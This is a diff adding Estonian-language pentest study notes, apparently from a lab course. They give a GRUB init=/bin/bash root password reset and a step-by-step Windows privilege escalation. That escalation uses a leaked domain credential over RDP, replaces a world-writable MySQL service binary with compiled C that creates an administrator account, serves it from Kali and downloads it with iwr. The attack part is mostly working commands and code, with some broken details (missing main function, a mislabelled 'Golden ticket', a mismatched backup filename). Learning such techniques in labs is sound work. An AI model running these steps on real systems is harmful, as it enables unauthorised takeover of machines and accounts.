@@ -1,3 +1,11 @@
+Linux pw reset:
+boot
+GRUB menüüs vajuta e
+linux real Asenda splash, guiet ja ro sellega rw init=/bin/bash
+nano /etc/shadow - siit leian kontod
+passwd kasutajanimi
+
+
 pentestgpt.ai?
 pfSense eeldab, et esimeses adapteris on internet ja teises oma VLAN
 
@@ -73,4 +81,43 @@ sudo service NetworkManager restart (taasta võrguteenus)
 
 ARP - Address Resolution Protocol
 
+Golden ticket:
+Eeldus: Meil on domeeni kasutaja
+1. Me otsime võrguskänniga sihtmärgi
+2. Me ühendame lekkinud kontoga terminal serverisse
+3. Me vaatame seal töötavaid teenuseid ja valime sihtmärgi (mysql)
+4. Me vaatame kas lekkinud kasutajal on õigusi sihtmärkfailiga tegeleda
+5. Me teeme skripti mis loob lokaalse admin konto ja teeme selle exe-ks
+6. Me jagame seda Kali masinast ja tõmbame sihtmärgi masinas alla
+7. Me asendame mysqld exe oma custom failiga ja teeme restardi, et see sisse laetaks
+8. Teeme uue rdp ühenduse uue loodud admin kontoga
 
+Kali 192.168.1.101
+DC01 192.168.1.2 (LDAP 3268/tcp)
+server1 192.168.1.17 (RDP 3389/tcp)
+sudo nmap -sV -O 192.168.1.0/24 otsime AD masinat
+Kompromiseeritud masinas lekkinud kasutajaga whoami /groups et näha kasutaja gruppe
+sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17 Proovime kas kasutajal on õigus ühenduda RDPga
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object State -like "Running" vaatame jooksvaid teenuseid
+  MySQL sellel juhul
+    icacls "C:\xampp\mysql\bin\mysqld.exe"
+      BUILTIN\Users:(F)
+    Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select_Object Startmode
+      Startmode Auto
+nano adduser.c loome skripti mis loob lokaalse konto
+  #include <stdlib.h>
+  {
+    int i;
+    i = system("net user pentest kalasaba1. /add");
+    i = system("net localgroup administrators /add");
+  return 0;
+}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe Teeme faili exeks
+python3 -m http.server 80 Jooksutame sellest kaustast veebiserveri, et serveerida just loodud fail
+
+iwr -Uri http://192.168.1.101/adduser.exe -OutFile adduser.exe RDP Terminali powershellis, et tõmmata serveeritud fail alla
+move C:\xampp\mysql\bin\mysql.exe oldmysql.exe Teeme originaalist backupi (see eeldab, et useril on õigust muuta)
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe (asendame originaali meie custom failiga)
+Restart-Computer (Saadame masina restarti, et uus fail mällu laetaks)
+sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17 (Logime sisse uue kasutajaga mille skript tegi)
